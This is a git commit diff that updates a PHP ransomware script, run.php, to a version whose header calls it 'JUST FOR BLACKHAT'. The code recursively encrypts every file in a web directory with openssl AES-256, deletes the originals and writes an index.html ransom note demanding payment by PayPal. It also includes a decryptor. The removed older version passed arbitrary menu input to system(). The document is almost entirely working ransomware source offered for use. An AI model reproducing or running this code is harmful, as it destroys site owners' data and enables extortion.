42529638fc8dcbbcb38f79b9e0eaa054de91a6e0
Sora Cyber Team <39432557+soracyberteam@users.noreply.github.com>
2018-12-08 20:13:23 -0500

    Update to new version

--- run.php
+++ run.php
@@ -1,80 +1,98 @@
 <?php
 /*
-    Ransomware With AES-256 Encryption.
-    @Author : Cy#b3r00T
-    @About  : Your Mom Gay
-    @Date   : 08 Dec 2018
+    Ransomware With AES-256 Encryption. [SUPER STRONG ENCRYPTION]
+    @Author  : Cy#b3r00T
+    @About   : Your Mom Gay
+    @Date    : 08 Dec 2018
+    @Version : 2.0.0
+    
+    WARNING! JUST FOR BLACKHAT HEHE :D
     Copyright (c) 2018 Sora Cyber Team
 */
 error_reporting(0);
-function encrypt($password,$email){
-$date=date("d/m/Y");
-$scan=scandir(getcwd());
-foreach($scan as $files){
-    if($files=="." | $files==".."){
-}elseif(!is_file($files)){
+function enc($dir,$pass,$mail){
+$x=scandir($dir);
+foreach($x as $xx){
+if($xx=="."|$xx==".."){}
+elseif(is_dir($xx)){
+enc("$dir/$xx",$pass,$mail);
 }else{
-$thix=basename($_SERVER['PHP_SELF']);
-if(preg_match("/$thix/",$files)){}else{
-    system("openssl aes-256-cbc -in $files -out $files.enc -k $password");
-    if(@unlink($files)){
-    echo "$files --> Encrypted\n";
-    $x=fopen("index.html",w);
-    fwrite($x,"<title>Hacked?</title><center><pre><h1>Your Website Has Been Encrypted</h1><h2>All of your files has been locked.
-    And will deleted on 24 hours from now [$date]
-    
-    Need Help?
-    $email");
-    fclose($x);
-    }else{echo "$files --> Failed :(";}
+$base=basename($_SERVER['PHP_SELF']);
+if(preg_match("/$base/",$xx)){continue;}else{
+$file="$dir/$xx";
+system("openssl aes-256-cbc -in '$file' -out '$file.enc' -k $pass");
+if(@unlink($file)){
+echo "$xx -> Encrypted !!\n";
+}else{
+echo "$xx -> Failed !!\n";
+}
+$fh=fopen('index.html',"w");
+fwrite($fh,"<title>Opps?</title><center><pre>Your Website Has Been Encrypted!
+All of your files has been locked.
+Pay me for $10 USD to unlock your files!
+
+PayPal
+$mail");
+fclose($fh);
+}
+}
+} //akhir foreach
+} //akhir fungsi
+function dec($dir,$pass){
+$x=scandir($dir);
+foreach($x as $xx){
+if($xx=="."|$xx==".."){}
+elseif(is_dir($xx)){
+dec("$dir/$xx",$pass);
+}else{
+$base=basename($_SERVER['PHP_SELF']);
+if(preg_match("/$base/",$xx)){continue;}elseif(preg_match("/enc/",$xx)){
+$file="$dir/$xx";
+$z=explode('.',$xx);
+$newf=$z[0].'.'.$z[1];
+$new="$dir/$newf";
+system("openssl aes-256-cbc -d -in '$file' -out '$new' -k $pass");
+unlink("$dir/index.html");
+if(@unlink($file)){
+echo "$file -> Done!\n";
+}else{echo "$file -> Failed!\n";}
 }
 }
 }
-}
-function decrypt($passwd){
-$scanz=scandir(getcwd());
-echo "Decrypting ...\n";
-sleep(3);
-foreach($scanz as $filesz){
-if(preg_match("/enc/",$filesz)){
-system("openssl aes-256-cbc -d -in $filesz -out $filesz.dec -k $passwd");
-unlink($filesz);
-echo "Done";
-}
-}
-}
-function password(){
-echo "Your Email : ";
-$mail=trim(fgets(STDIN));
-echo "Enter AES-256-cbc Password : ";
-system('stty -echo');
-$passwd=trim(fgets(STDIN));
-system('stty echo');
-sleep(1);
-echo "\nEncrypting ...\n";
-sleep(3);
-encrypt($passwd,$mail);
-exit;
 }
 function main(){
 echo " -----------------
 | Ransomware With | http://github.com/soracyberteam 
 |   AES-256 Enc   | Warning! just for education purpose only!
- -----------------\n";
+ -----------------
+  Version : 2.0.0\n";
 }menu:
+$cwd=getcwd();
+$ip=$_SERVER['SERVER_ADDR'];
 main();
-echo "[1] Encrypt\n[2] Decrypt\n[3] Exit\nroot@localhost:~# ";
-$fu=trim(fgets(STDIN));
-if($fu == "1"){
-password();
-}elseif($fu == "2"){
-echo "Enter AES-256 Password : ";
-$passwd=trim(fgets(STDIN));
-decrypt($passwd);
-}elseif($fu == "3"){
+echo "1. Encrypt\n2. Decrypt\n3. Exit\nransomware@$ip:~$ ";
+$cm=trim(fgets(STDIN));
+if($cm == "1"){
+system("stty -echo");
+echo "AES-256 Password : ";
+$pass=trim(fgets(STDIN));
+system("stty echo");
+echo "\nYour Email : ";
+$mail=trim(fgets(STDIN));
+sleep(1);
+echo "Encrypting ...\n";
+sleep(3);
+enc($cwd,$pass,$mail);
 exit;
-}else{
-system($fu);
-goto menu;
+}elseif($cm == "2"){
+system("stty -echo");
+echo "AES-256 Password : ";
+$pass=trim(fgets(STDIN));
+system("stty echo");
+sleep(1);
+echo "\nDecrypting ...\n";
+sleep(3);
+dec($cwd,$pass);
+exit;
 }
 ?>
